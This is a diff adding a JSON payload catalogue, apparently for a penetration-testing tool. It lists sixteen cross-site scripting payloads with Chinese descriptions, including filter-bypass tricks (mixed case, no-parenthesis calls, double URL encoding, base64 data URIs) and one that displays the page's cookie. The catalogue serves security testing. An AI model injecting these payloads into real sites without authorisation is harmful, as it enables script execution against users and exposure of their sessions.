@@ -1,0 +1,184 @@
+{
+  "kind": "payload",
+  "version": 1,
+  "group": "XSS 跨站脚本",
+  "categories": ["基础弹窗", "标签变体", "事件绕过", "编码与混淆", "DOM 场景"],
+  "items": [
+    {
+      "id": "xss-script-alert",
+      "title": "基础 script 弹窗",
+      "category": "基础弹窗",
+      "code": "<script>alert(1)</script>",
+      "desc": "最基础的反射型验证 payload，用于确认 HTML 上下文是否可执行脚本。",
+      "tags": ["xss", "reflected"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-img-onerror",
+      "title": "img onerror 弹窗",
+      "category": "标签变体",
+      "code": "<img src=1 onerror=alert(\"xss\");>",
+      "desc": "图片加载失败触发事件，适用于 script 标签被过滤的场景。",
+      "tags": ["xss", "event"],
+      "vars": [],
+      "risk": "attack",
+      "source": "公开资料"
+    },
+    {
+      "id": "xss-svg-onload",
+      "title": "svg onload 弹窗",
+      "category": "标签变体",
+      "code": "<svg/onload=alert(1)>",
+      "desc": "短小且不依赖外部资源，常用于绕过基于标签黑名单的过滤。",
+      "tags": ["xss", "svg"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-details-ontoggle",
+      "title": "details ontoggle 弹窗",
+      "category": "标签变体",
+      "code": "<details open ontoggle=alert(1)>",
+      "desc": "利用 details 元素展开时触发 ontoggle 事件。",
+      "tags": ["xss", "event"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-iframe-srcdoc",
+      "title": "iframe srcdoc 弹窗",
+      "category": "标签变体",
+      "code": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
+      "desc": "在 iframe 内部文档中执行脚本，适合 script 标签被转义但 iframe 未被限制的场景。",
+      "tags": ["xss", "iframe"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-a-javascript",
+      "title": "javascript 伪协议",
+      "category": "标签变体",
+      "code": "<a href=\"javascript:alert(1)\">click</a>",
+      "desc": "需要用户点击触发，适合验证链接 href 属性是否过滤。",
+      "tags": ["xss", "href"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-input-autofocus",
+      "title": "autofocus onfocus",
+      "category": "事件绕过",
+      "code": "<input autofocus onfocus=alert(1)>",
+      "desc": "页面加载后自动聚焦并触发 onfocus，无需用户交互。",
+      "tags": ["xss", "event"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-body-onload",
+      "title": "body onload",
+      "category": "事件绕过",
+      "code": "<body onload=alert(1)>",
+      "desc": "适用于可以注入 body 标签属性的场景。",
+      "tags": ["xss", "event"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-no-paren",
+      "title": "无括号执行",
+      "category": "事件绕过",
+      "code": "<svg onload=alert`1`>",
+      "desc": "使用模板字符串调用函数，绕过对括号的过滤。",
+      "tags": ["xss", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-case-mixed",
+      "title": "大小写混合标签",
+      "category": "编码与混淆",
+      "code": "<ScRiPt>alert(1)</ScRiPt>",
+      "desc": "针对简单黑名单匹配，HTML 标签本身不区分大小写。",
+      "tags": ["xss", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-html-entity",
+      "title": "HTML 实体编码",
+      "category": "编码与混淆",
+      "code": "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+      "desc": "当输入被放入 HTML 上下文且实体被解码时可能生效。",
+      "tags": ["xss", "encode"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-double-encode",
+      "title": "双重 URL 编码",
+      "category": "编码与混淆",
+      "code": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+      "desc": "用于服务端会再解码一次的场景，绕过单层编码检测。",
+      "tags": ["xss", "encode", "bypass"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-js-string",
+      "title": "JS 字符串闭合",
+      "category": "DOM 场景",
+      "code": "';alert(1);//",
+      "desc": "输入被拼接到 JavaScript 字符串中时，闭合引号后执行代码。",
+      "tags": ["xss", "dom"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-dom-hash",
+      "title": "DOM 型 hash 注入",
+      "category": "DOM 场景",
+      "code": "#<img src=x onerror=alert(1)>",
+      "desc": "针对使用 location.hash 直接写入 innerHTML 的前端代码。",
+      "tags": ["xss", "dom"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-cookie-display",
+      "title": "读取 Cookie 验证",
+      "category": "基础弹窗",
+      "code": "<script>alert(document.domain+\" | \"+document.cookie)</script>",
+      "desc": "验证脚本执行上下文与 Cookie 可读性，仅用于自有或授权目标。",
+      "tags": ["xss", "cookie"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    },
+    {
+      "id": "xss-srcdoc-encode",
+      "title": "base64 data URI",
+      "category": "编码与混淆",
+      "code": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
+      "desc": "通过 data URI 在 iframe 中执行脚本，适合绕过关键字过滤。",
+      "tags": ["xss", "data-uri"],
+      "vars": [],
+      "risk": "attack",
+      "source": "OWASP / PayloadsAllTheThings"
+    }
+  ]
+}
